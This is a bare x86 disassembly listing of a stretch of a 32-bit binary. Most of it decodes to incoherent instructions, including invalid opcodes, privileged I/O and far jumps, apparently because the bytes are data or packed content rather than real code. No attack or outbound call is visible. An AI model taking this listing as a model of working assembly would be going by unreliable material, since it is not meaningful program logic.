  4159a3:	outs   dx,BYTE PTR ds:[esi]
  4159a4:	jmp    0x415a12
  4159a6:	ror    BYTE PTR [esi+ebp*2+0x3d02cabe],1
  4159ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159ae:	mov    dl,0xed
  4159b0:	(bad)  
  4159b1:	jge    0x4159c6
  4159b3:	or     edi,DWORD PTR gs:[eax-0x12]
  4159b7:	add    ax,0xbd03
  4159bb:	mov    dh,0xb3
  4159bd:	and    eax,0x74bf71e8
  4159c2:	test   BYTE PTR [edi+0x57],0x4c
  4159c6:	mov    dl,0x48
  4159c8:	loopne 0x415a20
  4159ca:	out    dx,eax
  4159cb:	fwait
  4159cc:	test   DWORD PTR [ebx+0x77],0xdd4fd0ad
  4159d3:	xchg   edi,eax
  4159d4:	push   ds
  4159d5:	fwait
  4159d6:	gs loopne 0x415a53
  4159d9:	loope  0x4159d5
  4159db:	cmp    edi,edx
  4159dd:	xor    esp,DWORD PTR [edi+0x606379b4]
  4159e3:	dec    ebp
  4159e4:	dec    ecx
  4159e5:	ds xchg edi,eax
  4159e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e8:	sbb    eax,0x76c6b528
  4159ed:	xor    DWORD PTR [edi+0x4bab42ad],esp
  4159f3:	xchg   edi,eax
  4159f4:	cli    
  4159f5:	xor    BYTE PTR [esi+ecx*4],0x5c
  4159f9:	addr16 cdq 
  4159fb:	sub    al,bh
  4159fd:	push   cs
  4159fe:	das    
  4159ff:	push   esi
  415a00:	adc    eax,0x75ae300f
  415a05:	mov    ds:0xfb67f6a4,eax
  415a0a:	pop    ss
  415a0b:	add    DWORD PTR [eax-0x19],eax
  415a0e:	sar    BYTE PTR [eax+0x48],1
  415a11:	xor    esi,eax
  415a13:	fidivr WORD PTR [esi+0x59]
  415a17:	and    BYTE PTR [edi-0x1b086f20],bh
  415a1d:	pop    esp
  415a1e:	pop    esi
  415a1f:	mov    DWORD PTR [esp+esi*4-0x2d],ebx
  415a23:	mov    DWORD PTR [esi],esi
  415a25:	loope  0x4159de
  415a27:	adc    eax,0x4238d3e1
  415a2c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415a2e:	xchg   bh,bh
  415a30:	dec    edi
  415a31:	pop    ss
  415a32:	inc    esi
  415a33:	xor    dl,cl
  415a35:	or     al,0x42
  415a37:	mov    BYTE PTR [eax+edx*2],al
  415a3a:	scas   eax,DWORD PTR es:[edi]
  415a3b:	dec    edi
  415a3c:	jo     0x415a89
  415a3e:	add    al,0x27
  415a40:	or     bh,BYTE PTR [esi-0x28deabcc]
  415a46:	mov    esp,0x44fc3af4
  415a4b:	xor    eax,0x2160729b
  415a50:	pop    eax
  415a51:	mov    edi,0xfe7258f6
  415a56:	dec    edi
  415a57:	push   DWORD PTR [esi-0x63]
  415a5a:	cs add edx,ebx
  415a5d:	lahf   
  415a5e:	push   0x48
  415a60:	aaa    
  415a61:	cwde   
  415a62:	(bad)  
  415a63:	push   eax
  415a64:	pop    edx
  415a65:	sbb    cl,BYTE PTR [ebp+ebp*2+0x5771c96e]
  415a6c:	test   BYTE PTR [ecx-0xd50aa31],0xbe
  415a73:	mov    ebp,DWORD PTR [esi+0x8]
  415a76:	pop    esi
  415a77:	inc    ebx
  415a78:	sbb    DWORD PTR [edi],ebp
  415a7a:	scas   eax,DWORD PTR es:[edi]
  415a7b:	sbb    bh,BYTE PTR [esi]
  415a7d:	pop    DWORD PTR [edx-0x31fc566f]
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	xor    eax,0x4e5ded10
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415aab
  415abc:	xor    edi,ebx
  415abe:	rol    DWORD PTR [esi+0x65],1
  415ac1:	hlt    
  415ac2:	mov    dh,BYTE PTR [ecx-0x10]
  415ac5:	(bad)  
  415ac6:	pusha  
  415ac7:	inc    eax
  415ac8:	dec    ebx
  415ac9:	pop    ecx
  415aca:	mov    cs,WORD PTR [edi+0x6d]
  415acd:	xchg   edx,eax
  415ace:	pop    eax
  415acf:	mov    bh,0xc1
  415ad1:	adc    DWORD PTR [edx+0x450139a6],0xffffffbb
  415ad8:	repnz push esi
  415ada:	clc    
  415adb:	or     BYTE PTR [ebp-0x5b],ah
  415ade:	pusha  
  415adf:	or     edi,DWORD PTR [edi+ebp*4]
  415ae2:	cwde   
  415ae3:	loopne 0x415b64
  415ae5:	(bad)  [edi-0x2b]
  415ae8:	mov    eax,ds:0x4b0f0abe
  415aed:	push   ebx
  415aee:	sbb    DWORD PTR [esi+0x5e],ebx
  415af1:	add    cl,dl
  415af3:	fsubr  QWORD PTR [ecx]
  415af5:	jecxz  0x415ac6
  415af7:	into   
  415af8:	xchg   edi,eax
  415af9:	dec    ebx
  415afa:	dec    ecx
  415afb:	(bad)  
  415afc:	jbe    0x415b77
  415afe:	lods   eax,DWORD PTR ds:[esi]
  415aff:	scas   al,BYTE PTR es:[edi]
  415b00:	push   ss
  415b01:	test   DWORD PTR [eax],esp
  415b03:	pop    ds
  415b04:	cdq    
  415b05:	mov    bh,0x9b
  415b07:	mov    dh,0xcd
  415b09:	push   es
  415b0a:	mov    ah,ah
  415b0c:	(bad)
  415b0f:	lea    edx,[edi-0x79545aef]
  415b15:	mul    BYTE PTR [ebx]
  415b17:	and    DWORD PTR [ecx+0x0],esp
  415b1a:	mov    DWORD PTR [eax-0x3d],0xacc214c8
  415b21:	in     eax,0x4a
  415b23:	fild   QWORD PTR [ebx-0x7588eb98]
  415b29:	cs ins BYTE PTR es:[edi],dx
  415b2b:	and    DWORD PTR [esi-0x77d754f6],0xf
  415b32:	outs   dx,DWORD PTR ds:[esi]
  415b33:	ins    DWORD PTR es:[edi],dx
  415b34:	icebp  
  415b35:	retf   0x85cf
  415b38:	bswap  esp
  415b3a:	sahf   
  415b3b:	retf   
  415b3c:	mov    ds:0x56be3b9e,al
  415b41:	ins    DWORD PTR es:[edi],dx
  415b42:	cwde   
  415b43:	lea    eax,[edx+0x33969e14]
  415b49:	jl     0x415b7f
  415b4b:	int3   
  415b4c:	jbe    0x415b1d
  415b4e:	shl    BYTE PTR [ecx+0x32],1
  415b51:	pop    esp
  415b52:	mov    WORD PTR [eax],ds
  415b54:	adc    cl,BYTE PTR [ebp+ebp*2-0x23a30f6d]
  415b5b:	mov    eax,0xf5fefadb
  415b60:	fidiv  DWORD PTR [ebx]
  415b62:	and    al,0xf5
  415b64:	cmc    
  415b65:	mov    bh,0x7c
  415b67:	loop   0x415ba9
  415b69:	mov    DWORD PTR [ebx+0x52],ecx
  415b6c:	mov    edx,0xb4078fed
  415b71:	stc    
  415b72:	push   cs
  415b73:	lea    ebx,[edi-0x6e]
  415b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b77:	(bad)  
  415b79:	ror    DWORD PTR [esi],0xd8
  415b7c:	xchg   edi,eax
  415b7d:	jo     0x415b18
  415b7f:	xor    edi,DWORD PTR [edi-0xa99d7f9]
  415b85:	dec    ebx
  415b86:	mov    DWORD PTR [esi],esp
  415b88:	fisttp WORD PTR [si]
  415b8b:	xchg   esi,eax
  415b8c:	jg     0x415b43
  415b8e:	add    al,0xee
  415b90:	dec    ebp
  415b91:	adc    al,0x26
  415b93:	sbb    DWORD PTR [ebx-0x69918d0d],edx
  415b99:	cmp    eax,0xf068c782
  415b9e:	mov    eax,ds:0x9ece4825
  415ba3:	and    esi,DWORD PTR [ecx-0x34]
  415ba6:	inc    edi
  415ba7:	div    DWORD PTR [eax-0x48]
  415baa:	jle    0x415b72
  415bac:	dec    edx
  415bad:	mov    dl,0xd8
  415baf:	(bad)  
  415bb0:	das    
  415bb1:	icebp  
  415bb2:	test   eax,0xeb405229
  415bb7:	and    DWORD PTR [edx-0x77d9d394],edx
  415bbd:	push   0xffffffad
  415bbf:	and    bh,BYTE PTR [ecx+0x6a]
  415bc2:	enter  0xe1af,0xa9
  415bc6:	jmp    0x415b64
  415bc8:	rcl    DWORD PTR [edi],cl
  415bca:	in     al,dx
  415bcb:	jmp    0x415b64
  415bcd:	icebp  
  415bce:	push   ss
  415bcf:	push   esi
  415bd0:	out    0xd5,eax
  415bd2:	jo     0x415b86
  415bd4:	jmp    0x415bac
  415bd6:	in     eax,dx
  415bd7:	cmp    al,dl
  415bd9:	sbb    esp,DWORD PTR [eax]
  415bdb:	in     eax,0x78
  415bdd:	cmc    
  415bde:	rcr    bh,cl
  415be0:	arpl   ax,sp
  415be2:	pop    esp
  415be3:	test   al,0xb6
  415be5:	sbb    ecx,DWORD PTR [esi+0x9a9917d]
  415beb:	cmovnp ecx,DWORD PTR ds:0x5c1e746a
  415bf2:	sbb    eax,0xfb4aeb87
  415bf7:	jne    0x415c01
  415bf9:	mov    DWORD PTR [eax+0x2e],esp
  415bfc:	xor    edx,DWORD PTR [ebp-0x73]
  415bff:	lods   eax,DWORD PTR ds:[esi]
  415c00:	mov    BYTE PTR [ecx+eax*8+0x434cfa0b],0x48
  415c08:	mov    ecx,0x4b4253b
  415c0d:	leave  
  415c0e:	lahf   
  415c0f:	mov    WORD PTR [ebp-0x6b],cs
  415c12:	mov    edx,0xe12dadc7
  415c17:	pushf  
  415c18:	add    ecx,esp
  415c1a:	js     0x415c8e
  415c1c:	jg     0x415bb5
  415c1e:	or     eax,0x78fb9770
  415c23:	fild   WORD PTR [ecx+0x225d0f41]
  415c29:	sbb    DWORD PTR [esi-0x1ce177c7],ebx
  415c2f:	test   DWORD PTR [edi],eax
  415c31:	and    eax,0x4ff699a5
  415c36:	out    0x70,eax
  415c38:	fmul   DWORD PTR [ebx-0x8cd54a2]
  415c3e:	mov    ebp,0xcc48ea8a
  415c43:	jbe    0x415c78
  415c45:	cmp    dl,al
  415c47:	inc    ebx
  415c48:	jne    0x415be9
  415c4a:	inc    ebp
  415c4b:	jp     0x415bf4
  415c4d:	add    eax,0x1970ddf4
  415c52:	rcl    BYTE PTR [edi-0x6017ead9],cl
  415c58:	dec    esp
  415c59:	pop    ebx
  415c5a:	jno    0x415c8f
  415c5c:	add    ah,BYTE PTR [eax+0x7c]
  415c5f:	imul   eax,DWORD PTR [edi*8-0x1802af18],0xeb08751e
  415c6a:	mov    ch,0xfd
  415c6c:	sub    al,dl
  415c6e:	add    eax,0x8c5dd8ce
  415c73:	jmp    0x3754:0x8e24b32d
  415c7a:	(bad)  
  415c7b:	cld    
  415c7c:	lds    edx,FWORD PTR [ebx+0x419d947]
  415c82:	push   edi
  415c83:	xor    ecx,DWORD PTR [edx-0x1c]
  415c86:	jg     0x415c19
  415c88:	lock mov al,ds:0x6d264
  415c8e:	add    BYTE PTR [ebp-0x930be52],bh
  415c94:	cmp    BYTE PTR [esi-0x1b],dl
  415c97:	pop    es
  415c98:	mov    ebx,0x85760991
  415c9d:	push   ecx
  415c9e:	xchg   esi,eax
  415c9f:	jle    0x415d02
  415ca1:	xor    BYTE PTR ds:[ebx+ebp*1],bl
  415ca5:	shl    DWORD PTR [ebp+0x3a],1
  415ca8:	mov    esi,0x288e4ac9
  415cad:	pop    ds
  415cae:	jbe    0x415cbc
  415cb0:	lock dec esp
  415cb2:	cs out dx,al
  415cb4:	repz hlt 
  415cb6:	icebp  
  415cb7:	inc    ebx
  415cb8:	pop    ebx
  415cb9:	xchg   esi,eax
  415cba:	or     al,BYTE PTR [eax+0x6e376b35]
  415cc0:	repnz ds (bad) 
  415cc4:	mov    eax,0xf561f380
  415cc9:	sbb    eax,0xa5a33427
  415cce:	jb     0x415d0e
  415cd0:	or     edi,ebx
  415cd2:	psrlw  mm5,QWORD PTR [edx+0x71]
  415cd6:	push   0x6eaeb724
  415cdb:	rol    DWORD PTR [edx+eax*2-0x29],0x73
  415ce0:	mov    ebx,DWORD PTR [ebx+ebx*2-0x38]
  415ce4:	popa   
  415ce5:	in     eax,dx
  415ce6:	jns    0x415c77
  415ce8:	cmp    eax,0x471592f6
  415ced:	dec    edi
  415cee:	into   
  415cef:	xor    DWORD PTR [edx+0x6d],edx
  415cf2:	call   0x3ab3c6f7
  415cf7:	sbb    al,BYTE PTR [ecx-0x68]
  415cfa:	lock popf 
  415cfc:	in     eax,dx
  415cfd:	icebp  
  415cfe:	xor    BYTE PTR ds:0xb07539b7,ch
  415d04:	xor    edx,DWORD PTR [edx-0x1]
  415d07:	fild   WORD PTR [edx-0x2a92bc7]
  415d0d:	add    DWORD PTR [eax-0x22],ebx
  415d10:	mov    WORD PTR [ecx],?
  415d12:	cld    
  415d13:	xor    BYTE PTR [ebp-0x50],0xc7
  415d17:	stos   BYTE PTR es:[edi],al
  415d18:	fistp  WORD PTR [esi]
  415d1a:	shl    DWORD PTR [ebx],cl
  415d1c:	es dec esp
  415d1e:	mov    DWORD PTR [eax-0x6f29c34b],ebx
  415d24:	enter  0x424e,0xb3
  415d28:	stc    
  415d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d2a:	js     0x415d52
  415d2c:	push   ecx
  415d2d:	xchg   edi,eax
  415d2e:	sti    
  415d2f:	nop
  415d30:	mov    WORD PTR [ebx+0x7442137],ds
  415d36:	hlt    
  415d37:	out    0xb3,al
  415d39:	aas    
  415d3a:	call   0x9ddd:0x1235e63a
  415d41:	outs   dx,BYTE PTR ds:[esi]
  415d42:	ja     0x415ce2
  415d44:	shl    edi,1
  415d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d47:	mov    al,BYTE PTR [ebx]
  415d49:	daa    
  415d4a:	fadd   st,st(5)
  415d4c:	or     BYTE PTR [edx+0x66],cl
  415d4f:	add    al,0xd3
  415d51:	cdq    
  415d52:	stos   BYTE PTR es:[edi],al
  415d53:	push   ebp
  415d54:	cmp    al,0xd
  415d56:	test   BYTE PTR [ebp+edx*2+0x7e582186],bl
  415d5d:	imul   BYTE PTR [eax-0x3c]
  415d60:	inc    ecx
  415d61:	jb     0x415cff
  415d63:	fist   WORD PTR [eax-0x52]
  415d66:	hlt    
  415d67:	leave  
  415d68:	add    BYTE PTR [ebx+eiz*4+0x6c],bh
  415d6c:	jbe    0x415da2
  415d6e:	ds lock sbb al,0xa0
  415d72:	xchg   esp,eax
  415d73:	loopne 0x415de3
  415d75:	std    
  415d76:	enter  0xb169,0xad
  415d7a:	mov    esp,0x8792b515
  415d7f:	mov    dl,0xec
  415d81:	push   es
  415d82:	push   0xffffffef
  415d84:	sbb    ecx,0x4c46c960
  415d8a:	sub    al,ch
  415d8c:	xor    BYTE PTR [edi+eax*2+0x77],bl
  415d90:	jae    0x415dc8
  415d92:	pushf  
  415d93:	dec    edx
  415d94:	ds push ebx
  415d96:	lock or BYTE PTR [ebp+0x6fc79ce6],al
  415d9d:	in     al,0x3b
  415d9f:	add    ch,ch
  415da1:	cld    
  415da2:	pusha  
  415da3:	xchg   ecx,eax
  415da4:	mov    al,0x9c
  415da6:	lock dec ebx
  415da8:	aam    0x99
  415daa:	sub    esp,DWORD PTR [esi]
  415dac:	es sbb eax,0x9d5653f4
  415db2:	inc    edx
  415db3:	enter  0x21db,0x43
  415db7:	(bad)  
  415db8:	jmp    0x4712:0x6916f03
  415dbf:	fst    QWORD PTR [ebx+0x1949b669]
  415dc5:	jns    0x415dda
  415dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dc8:	adc    bl,bl
  415dca:	not    ah
  415dcc:	add    bh,BYTE PTR [ebp+0x27]
  415dcf:	sub    eax,0xcc552d1d
  415dd4:	add    ch,dl
  415dd6:	sub    bl,BYTE PTR [eax+0x28979550]
  415ddc:	mov    ds:0x35136182,al
  415de1:	push   0x96ab4607
  415de6:	push   esi
  415de7:	outs   dx,DWORD PTR ds:[esi]
  415de8:	or     eax,DWORD PTR [ebx]
  415dea:	nop
  415deb:	mov    al,ds:0xd3cd400b
  415df0:	jecxz  0x415e0b
  415df2:	adc    bl,dl
  415df4:	cmp    eax,0x6be07928
  415df9:	into   
  415dfa:	es xor eax,0x872d069b
  415e00:	sahf   
  415e01:	sbb    al,0x9a
  415e03:	jmp    0x415daa
  415e05:	scas   eax,DWORD PTR es:[edi]
  415e06:	fisttp DWORD PTR [ecx+0x73]
  415e09:	mov    ds:0x330a3909,eax
  415e0e:	adc    edx,DWORD PTR [ebx+ebp*4-0x68]
  415e12:	aam    0xe9
  415e14:	mov    bh,0x13
  415e16:	pop    edi
  415e17:	fmul   QWORD PTR [edi+0x32dec2a7]
  415e1d:	sub    BYTE PTR [edi+0x56b70c68],dh
  415e23:	or     eax,0x1a84ad1a
  415e28:	outs   dx,DWORD PTR ds:[esi]
  415e29:	test   DWORD PTR [ecx+0x66],ebx
  415e2c:	in     al,dx
  415e2d:	inc    edx
  415e2e:	lock sahf 
  415e30:	loope  0x415e07
  415e32:	dec    BYTE PTR [ebx-0x4882ac45]
  415e38:	add    bh,cl
  415e3a:	dec    ebx
  415e3b:	xchg   edi,eax
  415e3c:	dec    ebx
  415e3d:	cmp    edi,edx
  415e3f:	adc    BYTE PTR [ebx-0x40],0x8b
  415e43:	js     0x415e1b
  415e45:	pop    edi
  415e46:	gs xchg edx,eax
  415e48:	inc    esi
  415e49:	ss jno 0x415ebf
  415e4c:	out    dx,al
  415e4d:	jp     0x415e46
  415e4f:	jne    0x415eb3
  415e51:	addps  xmm6,XMMWORD PTR [esi]
  415e54:	mov    bl,0x88
  415e56:	push   es
  415e57:	sub    BYTE PTR [ecx+0x7fd08370],0xd0
  415e5e:	into   
  415e5f:	test   BYTE PTR [ebp+eiz*2-0x77],dl
  415e63:	push   esp
  415e64:	loope  0x415e04
  415e66:	mov    ebp,0x31770b06
  415e6b:	jle    0x415ec2
  415e6d:	inc    ecx
  415e6e:	(bad)  
  415e6f:	(bad)  
  415e70:	pushf  
  415e71:	ins    DWORD PTR es:[edi],dx
  415e72:	repnz nop
  415e74:	or     eax,0x78a4f649
  415e79:	jno    0x415eda
  415e7b:	and    BYTE PTR [ebx],0x7e
  415e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e7f:	cmp    esi,DWORD PTR [edx-0x27]
  415e82:	out    dx,eax
  415e83:	adc    dl,al
  415e85:	jle    0x415e8e
  415e87:	or     eax,0xa8a8b6ae
  415e8c:	fistp  DWORD PTR [ecx-0x2b]
  415e8f:	(bad)  
  415e90:	addr16 sbb eax,0xb5497b23
  415e96:	fcmovnu st,st(7)
  415e98:	mov    ah,ah
  415e9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e9b:	sub    eax,0x243ecac3
  415ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ea1:	jge    0x415e28
  415ea3:	mov    esi,0x73fa954f
  415ea8:	push   edx
  415ea9:	mov    al,ds:0xcce02384
  415eae:	mov    edi,0xb44cf909
  415eb3:	or     al,0xc0
  415eb5:	mov    DWORD PTR [ebx-0x11],ebx
  415eb8:	mov    edi,esi
  415eba:	jne    0x415f2d
  415ebc:	push   esp
  415ebe:	sub    edi,edi
  415ec0:	fist   WORD PTR [edi]
  415ec2:	xchg   ecx,eax
  415ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec4:	add    DWORD PTR [ebp-0x5b0e2186],0xffffff8b
  415ecb:	inc    ebp
  415ecc:	test   DWORD PTR [eax-0x1c],ebp
  415ecf:	mov    eax,ds:0x50341653
  415ed4:	outs   dx,DWORD PTR ds:[esi]
  415ed5:	inc    ebx
  415ed6:	mov    BYTE PTR [esi-0x6d8a2ef1],al
  415edc:	xchg   BYTE PTR [edi-0x41],dl
  415edf:	adc    eax,0xd04b650b
  415ee4:	cli    
  415ee5:	out    0x83,eax
  415ee7:	call   0x74d0:0xab3b9d33
  415eee:	aas    
  415eef:	int3   
  415ef0:	daa    
  415ef1:	(bad)  
  415ef2:	mov    ah,0x23
  415ef4:	mov    dl,0x73
  415ef6:	dec    ebx
  415ef7:	inc    eax
  415ef8:	inc    eax
  415ef9:	mov    edx,0x7a098a36
  415efe:	pop    ds
  415eff:	daa    
  415f00:	and    DWORD PTR [eax+ebp*4-0x6944dd26],eax
  415f07:	mov    cl,0xcd
  415f09:	inc    ebx
  415f0a:	and    bh,BYTE PTR [ebp-0x53]
  415f0d:	call   0x2d9d4f25
  415f12:	and    al,0x64
  415f14:	ror    bh,1
  415f16:	or     eax,0x1eaf80e4
  415f1b:	cmp    bh,BYTE PTR ds:0xdd40dccb
  415f21:	and    BYTE PTR [ebp-0xe67929f],cl
  415f27:	(bad)  
  415f28:	ins    DWORD PTR es:[edi],dx
  415f29:	jbe    0x415ee1
  415f2b:	shl    DWORD PTR ds:0x365a0aa4,0x2
  415f32:	out    0xea,al
  415f34:	and    bl,BYTE PTR [ebp-0x80]
  415f37:	add    ch,dl
  415f39:	jl     0x415f87
  415f3b:	mov    dl,BYTE PTR [edi-0x6a]
  415f3e:	push   es
  415f3f:	out    0x37,eax
  415f41:	mov    ds:0xbbbe5621,eax
  415f46:	or     edx,DWORD PTR [ebp-0x2ff0f9c0]
  415f4c:	mov    bh,0xca
  415f4e:	imul   esp,DWORD PTR [ecx],0xf59fe351
  415f54:	push   cs
  415f55:	iret   
  415f56:	sub    BYTE PTR [edi+0x6a118990],al
  415f5c:	mov    eax,0x1ffb8193
  415f61:	xchg   ebp,eax
  415f62:	rcr    BYTE PTR [esi+0x7a2e2452],cl
  415f68:	jnp    0x415fc6
  415f6a:	xor    BYTE PTR [ebx-0x21e3b09c],bl
  415f70:	mov    dl,0x6e
  415f72:	je     0x415f4d
  415f74:	clc    
  415f75:	(bad)  [eax-0x5d]
  415f78:	outs   dx,DWORD PTR ds:[esi]
  415f79:	pop    ss
  415f7a:	ss call 0x28b3004e
  415f80:	jg     0x415f7e
  415f82:	dec    edi
  415f83:	push   ebx
  415f84:	pop    ebx
  415f85:	push   edx
  415f86:	xor    DWORD PTR [edi],edi
  415f88:	adc    DWORD PTR [edi],esp
  415f8a:	arpl   dx,sp
  415f8c:	or     eax,0xde195099
  415f91:	mov    ah,0xcc
  415f93:	push   ss
  415f94:	jg     0x415fd4
  415f96:	loopne 0x415fc7
  415f98:	retf   
  415f99:	test   eax,0xd057e728
  415f9e:	push   ds
  415f9f:	and    DWORD PTR [ebp+eiz*1+0x6b],esp
  415fa3:	xchg   ebp,esp
  415fa5:	and    cl,dl
  415fa7:	rcl    BYTE PTR [esi+0x62],1
  415faa:	inc    edi
  415fab:	mov    bh,0x31
  415fad:	mov    bh,0x8
  415faf:	std    
  415fb0:	push   ds
  415fb1:	inc    esi
  415fb2:	or     BYTE PTR [ecx+0x27c8bc20],0xa
  415fb9:	popf   
  415fba:	outs   dx,DWORD PTR ds:[esi]
  415fbb:	fnsave [edx]
  415fbd:	out    dx,al
  415fbe:	adc    dl,BYTE PTR [edi-0x69f0900f]
  415fc4:	int3   
  415fc5:	cmp    al,0x3a
  415fc7:	shl    bh,cl
  415fc9:	ins    DWORD PTR es:[edi],dx
  415fca:	or     BYTE PTR [esi-0x10],bl
  415fcd:	xchg   ebx,eax
  415fce:	mov    esi,0x37217a54
  415fd3:	adc    eax,0x339856df
  415fd8:	aaa    
  415fd9:	mov    edi,0x228f7c92
  415fde:	ficomp WORD PTR [edi+0x77c88518]
  415fe4:	mov    esi,0xc180c527
  415fe9:	adc    eax,0xbc1da1c9
  415fee:	mov    dl,0xb9
  415ff0:	stos   DWORD PTR es:[edi],eax
  415ff1:	shl    DWORD PTR [ebx+0xc93fb91],1
  415ff7:	xchg   edx,eax
  415ff8:	sti    
  415ff9:	jb     0x416000
  415ffb:	stc    
  415ffc:	xchg   DWORD PTR [ebx],ecx
  415ffe:	push   edi
  415fff:	inc    ebx
  416000:	xlat   BYTE PTR ds:[ebx]
  416001:	dec    edx
  416002:	cmp    edx,ebp
  416004:	xchg   esp,eax
  416005:	and    BYTE PTR [ebx+0x37076cce],dl
  41600b:	ret    0x929b
  41600e:	mov    ds:0xc57c0cd2,al
  416013:	fbstp  TBYTE PTR [ecx+0x67fac802]
  416019:	call   0x5d264055
  41601e:	shl    BYTE PTR [edx],cl
  416020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416021:	xor    al,0x11
  416023:	fs icebp 
  416025:	mov    esi,0x727419ce
  41602a:	into   
  41602b:	sub    edx,DWORD PTR [esi]
  41602d:	pop    esi
  41602e:	sub    bh,cl
  416030:	mov    ds:0x29c4a111,eax
  416035:	rcr    BYTE PTR [esi+0x27ec91ed],0x9b
  41603c:	push   ecx
  41603d:	jno    0x41602f
  41603f:	call   0x606b:0x333051f6
  416046:	pop    edi
  416047:	inc    esp
  416048:	mov    esi,0xffd4ad4a
  41604d:	mov    ecx,DWORD PTR [ebx-0x1f39c842]
  416053:	das    
  416054:	clc    
  416055:	xchg   esp,eax
  416056:	fdivr  QWORD PTR [eax-0x25]
  416059:	ficom  WORD PTR [ebx+0x3]
  41605c:	call   0xde7e:0x11acbd11
  416063:	jbe    0x41608c
  416065:	test   dh,dh
  416067:	pop    ebx
  416068:	adc    al,0x8a
  41606a:	loope  0x416066
  41606c:	scas   eax,DWORD PTR es:[edi]
  41606d:	xor    cl,BYTE PTR [ebp+0x55]
  416070:	mov    bl,0x61
  416072:	dec    ecx
  416073:	outs   dx,DWORD PTR ds:[esi]
  416074:	jnp    0x416034
  416076:	jle    0x4160f1
  416078:	sub    al,0x50
  41607a:	and    WORD PTR [esi+edi*4],bp
  41607e:	ins    DWORD PTR es:[edi],dx
  41607f:	push   0x385f762b
  416084:	add    cl,cl
  416086:	ss cmc 
  416088:	fmul   DWORD PTR [edi+0x36bb47cc]
  41608e:	leave  
  41608f:	or     eax,0x8012f234
  416094:	pop    DWORD PTR [esi]
  416096:	out    0x53,al
  416098:	cmp    DWORD PTR [edx-0x25d26525],edx
  41609e:	xrelease mov BYTE PTR ds:0xa439,dh
  4160a4:	daa    
  4160a5:	out    0x4,eax
  4160a7:	cmp    ebp,DWORD PTR [ecx-0x3321f35b]
  4160ad:	out    0xf5,al
  4160af:	and    eax,0x45ffbdb8
  4160b4:	lock lahf 
  4160b6:	dec    eax
  4160b7:	ret    0xdb02
  4160ba:	sbb    bh,BYTE PTR [ebx+0x29ce98d5]
  4160c0:	add    esp,edi
  4160c2:	ins    DWORD PTR es:[edi],dx
  4160c3:	mov    al,BYTE PTR [esi]
  4160c5:	stos   BYTE PTR es:[edi],al
  4160c6:	xchg   BYTE PTR [eax+0x24],al
  4160c9:	fdiv   QWORD PTR [ecx+0x53]
  4160cc:	in     al,dx
  4160cd:	int3   
  4160ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160cf:	ret    0x2cce
  4160d2:	inc    eax
  4160d3:	xchg   edx,eax
  4160d4:	pop    ds
  4160d5:	push   ebp
  4160d6:	in     al,0xa9
  4160d8:	and    DWORD PTR [esi+0x7cf7d4ff],edx
  4160de:	add    BYTE PTR [esp+ebp*1-0x6b],bl
  4160e2:	fild   WORD PTR [esi+0x7d]
  4160e5:	call   0xed47:0xb8d913fe
  4160ec:	jbe    0x416160
  4160ee:	push   0x3
  4160f0:	dec    esp
  4160f1:	pop    edi
  4160f2:	xchg   esp,ebp
  4160f4:	pop    ecx
  4160f5:	inc    ebx
  4160f6:	call   0x558d91e3
  4160fb:	mov    ds:0xfadf369b,eax
  416100:	pop    edi
  416101:	cmp    ebp,ebx
  416103:	inc    edi
  416104:	add    ecx,DWORD PTR [ebx+0xa]
  416107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416108:	pop    edx
  416109:	das    
  41610a:	mov    ds:0xa63e4af7,al
  41610f:	push   ds
  416110:	pop    es
  416111:	fistp  DWORD PTR [edi+eax*4+0x693d83e5]
  416118:	call   0xa5190de6
  41611d:	and    al,dh
  41611f:	push   es
  416120:	mov    bh,0x17
  416122:	cmc    
  416123:	sub    eax,0xfd2f2e82
  416128:	pop    eax
  416129:	inc    edx
  41612a:	cmc    
  41612b:	push   ebp
  41612c:	lods   al,BYTE PTR ds:[esi]
  41612d:	into   
  41612e:	retf   
  41612f:	shl    BYTE PTR [ecx-0x58],0xa4
  416133:	dec    BYTE PTR [ebx-0x7]
  416136:	xchg   esp,eax
  416137:	mov    ecx,0x1ef4642d
  41613c:	out    dx,al
  41613d:	push   esp
  41613e:	cmp    BYTE PTR [edi-0x29],ah
  416141:	cld    
  416142:	jne    0x416136
  416144:	pop    edx
  416145:	leave  
  416146:	enter  0x82c,0xdb
  41614a:	ja     0x41610b
  41614c:	jp     0x4160cf
  41614e:	scas   al,BYTE PTR es:[edi]
  41614f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416150:	add    bh,BYTE PTR [ecx-0x71b6a4eb]
  416156:	stc    
  416157:	ret    0x348c
  41615a:	scas   al,BYTE PTR es:[edi]
  41615b:	pop    ss
  41615c:	ins    DWORD PTR es:[edi],dx
  41615d:	test   al,0x61
  41615f:	sbb    dh,dl
  416161:	in     eax,dx
  416162:	fdiv   QWORD PTR [edx]
  416164:	push   ds
  416165:	dec    esp
  416166:	clc    
  416167:	test   esp,esi
  416169:	sub    al,0xcc
  41616b:	mov    ch,0x87
  41616d:	pop    edi
  41616e:	push   0x1ab7087d
  416173:	out    0xd9,al
  416175:	cwde   
  416176:	cmp    DWORD PTR [edi-0x21],ecx
